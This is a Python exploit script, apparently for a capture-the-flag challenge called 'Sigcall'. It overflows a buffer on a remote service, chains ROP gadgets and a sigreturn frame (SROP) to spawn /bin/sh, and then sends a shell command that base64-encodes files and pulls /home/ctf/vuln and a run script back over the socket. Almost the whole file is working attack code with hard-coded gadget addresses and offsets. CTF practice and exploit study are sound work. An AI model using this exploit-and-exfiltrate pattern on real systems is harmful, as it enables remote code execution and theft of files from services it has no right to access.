#!/usr/bin/env python3
"""Sigcall - descarga /home/ctf/vuln (base64) tras obtener shell via SROP."""
import base64
import re
import socket
import struct
import time

from pwn import SigreturnFrame, context

context.clear(arch="amd64", os="linux")
HOST, PORT = "<host>", 28807
p64 = lambda x: struct.pack("<Q", x)
u64 = lambda b: struct.unpack("<Q", b.ljust(8, b"\x00"))[0]

POP_R9, POP_RDI, WRITE_QWORD = 0x401178, 0x4011CF, 0x401182
POP_RAX, SYSCALL, OFFSET, BSS = 0x4011A6, 0x401161, 136, 0x404028


def write_q(a, v):
    return (p64(POP_R9) + p64(v) + p64(0) + p64(POP_RDI) + p64(a)
            + p64(WRITE_QWORD) + p64(0))


def build():
    p = b"A" * OFFSET
    p += write_q(BSS, u64(b"/bin/sh\x00"))
    p += write_q(BSS + 8, 0)
    p += p64(POP_RAX) + p64(15) + p64(0) + p64(SYSCALL)
    f = SigreturnFrame()
    f.rax, f.rdi, f.rsi, f.rdx = 59, BSS, BSS + 8, 0
    f.rip, f.rsp = SYSCALL, 0x404800
    return p + bytes(f)


def grab(path, local):
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(4)
    s.recv(4096)
    s.sendall(build())
    time.sleep(0.8)
    s.sendall(b"echo __B64__; base64 -w0 " + path.encode() + b"; echo; echo __END__\n")
    data = b""
    deadline = time.time() + 30
    while b"__END__" not in data and time.time() < deadline:
        try:
            d = s.recv(65536)
            if not d:
                break
            data += d
        except socket.timeout:
            break
    s.close()
    m = re.search(rb"__B64__\r?\n([A-Za-z0-9+/=]+)", data)
    if not m:
        print("no se pudo extraer", path, data[:300])
        return None
    raw = base64.b64decode(m.group(1))
    open(local, "wb").write(raw)
    print(f"{path} -> {local} ({len(raw)} bytes)")
    return raw


if __name__ == "__main__":
    grab("/home/ctf/vuln", "vuln")
    grab("/home/ctf/run", "run.sh")
    print(open("run.sh", "r", errors="replace").read())
